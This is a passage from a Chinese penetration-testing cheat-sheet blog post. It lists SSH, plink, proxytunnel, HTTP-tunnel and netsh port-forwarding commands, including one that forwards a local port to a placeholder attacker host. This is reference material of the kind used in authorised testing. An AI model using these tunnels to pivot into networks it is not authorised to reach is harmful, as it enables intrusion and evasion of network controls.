<h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: expose RDP on non-routable network;</span></span><br><span class="line">ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER</span><br><span class="line">plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</span><br></pre></td></tr></table></figure>
<h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open a <span class="built_in">local</span> port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: a remote host has SSH running, but it<span class="string">&#x27;s only bound to 127.0.0.1, but you want to reach it;</span></span></span><br><span class="line">proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555</span><br><span class="line">ssh user@127.0.0.1 -p 5555</span><br></pre></td></tr></table></figure>
<h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22</span></span><br><span class="line">hts -F localhost:22 80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80</span></span><br><span class="line">htc -F 8080 192.168.1.15:80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22</span></span><br><span class="line">ssh localhost -p 8080</span><br></pre></td></tr></table></figure>
<h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加一个IPV4到IPV4的端口映射</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定监听ip和端口可以删除</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看存在的转发</span></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/" data-id="clllrw16i000t98y5fiae8wrv" data-title="渗透测试速查表" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CheckList/" rel="tag">CheckList</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>

    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CheckList/" rel="tag">CheckList</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag">后渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96/" rel="tag">持久化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AC%BA%E9%AA%97/" rel="tag">欺骗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CheckList/" style="font-size: 15px;">CheckList</a> <a href="/tags/HackTheBox/" style="font-size: 10px;">HackTheBox</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Shellcode/" style="font-size: 20px;">Shellcode</a> <a href="/tags/powershell/" style="font-size: 10px;">powershell</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" style="font-size: 15px;">后渗透</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">基础</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96/" style="font-size: 10px;">持久化</a> <a href="/tags/%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">欺骗</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 10px;">爬虫</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/08/22/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/">HackTheBox PhoneBook WriteUP</a>
          </li>
        
          <li>
            <a href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/">关于Linux下反弹Shell命令的解释</a>
          </li>
        
          <li>
            <a href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/">利用Powershell修改文件/文件夹时间属性</a>
          </li>
        
          <li>
            <a href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/">一个Get-Title的自我修养</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 忘返<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>